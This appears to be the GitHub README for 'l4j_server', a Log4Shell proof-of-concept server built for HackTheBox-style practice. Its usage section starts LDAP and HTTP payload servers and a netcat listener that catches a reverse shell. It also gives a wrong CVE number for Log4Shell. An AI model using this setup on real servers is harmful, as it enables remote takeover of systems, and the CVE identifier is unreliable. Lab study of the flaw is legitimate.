

# l4j_server 
l4j_server is a lightweight, standalone server to be used a POC for the L4J vulnerability associated with Log4Shell (CVE-2021-22448)    


## Screenshot



![l4j_server in action](https://raw.githubusercontent.com/serialwaffle/l4j_server/main/l4j_server.png)


## Dependencies
- [pwntools](https://pypi.org/project/pwntools/)
- [This project runs best on Kali OS](https://www.kali.org/)


## Installation
```
git clone https://github.com/serialwaffle/l4j_server.git
```

Download **jdk-8u202-linux-x64.tar.gz** from:

https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html



Untar jdk in l4j_server repo directory
```
tar -xvf jdk-8u202-linux-x64.tar.gz
```

Create a share directory for payload creation and sharing.
```
mkdir share
```



## Usage
```
python3 l4j_server.py <callback_ip:callback_port> <HTTP_server_port> <LDAP_server_port>

nc -lnvp <callback_port>

```


## Support 
If you appreciate my work and HackTheBox, feel free to give me some respect:  

<a href="https://www.hackthebox.eu/profile/5305"><img src="https://www.hackthebox.eu/badge/image/5305" width="150"></a>


